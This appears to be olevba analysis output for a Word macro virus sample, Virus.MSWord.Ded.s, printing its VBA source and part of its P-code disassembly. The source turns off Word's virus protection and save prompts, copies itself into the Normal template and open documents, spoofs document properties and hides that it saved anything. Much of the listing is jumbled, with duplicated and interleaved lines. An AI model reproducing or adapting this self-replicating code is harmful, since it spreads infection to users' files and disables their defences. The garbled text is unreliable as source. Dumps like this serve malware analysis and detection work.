olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
 ()
On Error Resume Next
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.EnableCancelKey = wdCancelDisabled
With Options:
Application.EnableCancelKey = wdCancelDisabled
With Options:
With Options:
    .ConfirmConversions = False:
With Options:
    .ConfirmConversions = False:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SavePropertiesPrompt = False:
End With
    .SavePropertiesPrompt = False:
End With
End With
s = ActiveDocument.Saved
End With
s = ActiveDocument.Saved
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sFunc = "Private Sub Document_Open()"
Found = False
sFunc = "Private Sub Document_Open()"
Found = False
Found = False
If Dir(sName) <> "" Then Kill sName
Found = False
If Dir(sName) <> "" Then Kill sName
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Open sName For Output As #1
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Found = False And (a = sFunc) Then Found = True
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If a <> "" And Found = True Then Print #1, a
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If a = "End Sub" And Found = True Then Found = False
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Next i
    If Found = False And (a = sFunc) Then Found = True
Close #1
    If Found = False And (a = sFunc) Then Found = True
j = 1
    If a <> "" And Found = True Then Print #1, a
k = 1
    If a <> "" And Found = True Then Print #1, a
t = 0
    If a = "End Sub" And Found = True Then Found = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    If a = "End Sub" And Found = True Then Found = False
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
Next i
    t = t + 1
Next i
End If
Close #1
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
Close #1
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
j = 1
    t = t + 2
j = 1
End If
k = 1
If t > 0 Then
k = 1
    Open sName For Input As #1
t = 0
    If LOF(1) = 0 Then GoTo quit
t = 0
    i = 1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Do While Not EOF(1)
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
        Line Input #1, a
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
        If t = 1 Or t = 3 Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
            nml.CodeModule.InsertLines j, a
    t = t + 1
            j = j + 1
    t = t + 1
        End If
End If
        If t = 2 Or t = 3 Then
End If
            atv.CodeModule.InsertLines k, a
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
            k = k + 1
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
        End If
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    Loop
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
quit:
    t = t + 2
    Close #1
    t = t + 2
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
End If
    .Title = "Ethan Frome":
If t > 0 Then
    .Author = "EW/LN/CB":
If t > 0 Then
    .Keywrds = "Ethan":
    Open sName For Input As #1
    .Execute:
    Open sName For Input As #1
End With
    If LOF(1) = 0 Then GoTo quit
If Left(ActiveDocument.Name, 8) <> "Document" Then
    If LOF(1) = 0 Then GoTo quit
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    i = 1
End If
    i = 1
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Do While Not EOF(1)
Kill sName
    Do While Not EOF(1)
Application.EnableCancelKey = wdCancelInterrupt
        Line Input #1, a
End Sub
        Line Input #1, a
        If t = 1 Or t = 3 Then
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            nml.CodeModule.InsertLines j, a
            j = j + 1
            j = j + 1
        End If
        End If
        If t = 2 Or t = 3 Then
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            atv.CodeModule.InsertLines k, a
            k = k + 1
            k = k + 1
        End If
        End If
    Loop
    Loop
quit:
quit:
    Close #1
    Close #1
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Keywrds = "Ethan":
    .Execute:
    .Execute:
End With
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
Application.EnableCancelKey = wdCancelInterrupt
End Sub
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11745 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Reparse 0x0003 " ()"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #10:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #12:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #14:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #15:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #16:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #23:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #24:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #29:
' 	EndWith 
' Line #30:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #31:
' 	EndWith 
' Line #32:
' 	EndWith 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #34:
' 	EndWith 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #37:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #39:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #40:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #41:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #42:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #43:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #44:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #45:
' 	LitVarSpecial (False)
' 	St Found 
' Line #46:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #47:
' 	LitVarSpecial (False)
' 	St Found 
' Line #48:
' 	LitVarSpecial (False)
' 	St Found 
' Line #49:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #50:
' 	LitVarSpecial (False)
' 	St Found 
' Line #51:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #52:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #53:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #54:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #55:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #56:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #58:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #59:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #61:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #63:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #64:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #65:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #66:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #71:
' 	LitDI2 0x0001 
' 	St j 
' Line #72:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #73:
' 	LitDI2 0x0001 
' 	St k 
' Line #74:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #75:
' 	LitDI2 0x0000 
' 	St t 
' Line #76:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #77:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #79:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #85:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #88:
' 	LitDI2 0x0001 
' 	St j 
' Line #89:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #90:
' 	LitDI2 0x0001 
' 	St j 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	LitDI2 0x0001 
' 	St k 
' Line #93:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #94:
' 	LitDI2 0x0001 
' 	St k 
' Line #95:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #96:
' 	LitDI2 0x0000 
' 	St t 
' Line #97:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #98:
' 	LitDI2 0x0000 
' 	St t 
' Line #99:
' 	LitDI2 0x0001 
' 	St i 
' Line #100:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #101:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #102:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #103:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #104:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #105:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #106:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #107:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #108:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #109:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #110:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #116:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #117:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #118:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #121:
' 	Loop 
' Line #122:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #123:
' 	Label quit 
' Line #124:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #126:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #132:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #133:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #134:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #135:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #136:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #137:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #138:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #139:
' 	EndWith 
' Line #140:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #141:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #142:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #143:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #144:
' 	LitDI2 0x0001 
' 	St i 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	LitDI2 0x0001 
' 	St i 
' Line #147:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #148:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #149:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #150:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #151:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #152:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #153:
' 	EndSub 
' Line #154:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #155:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #156:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #157:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #158:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #159:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #160:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #164:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #165:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #166:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #167:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #168:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	Loop 
' Line #172:
' 	Loop 
' Line #173:
' 	Label quit 
' Line #174:
' 	Label quit 
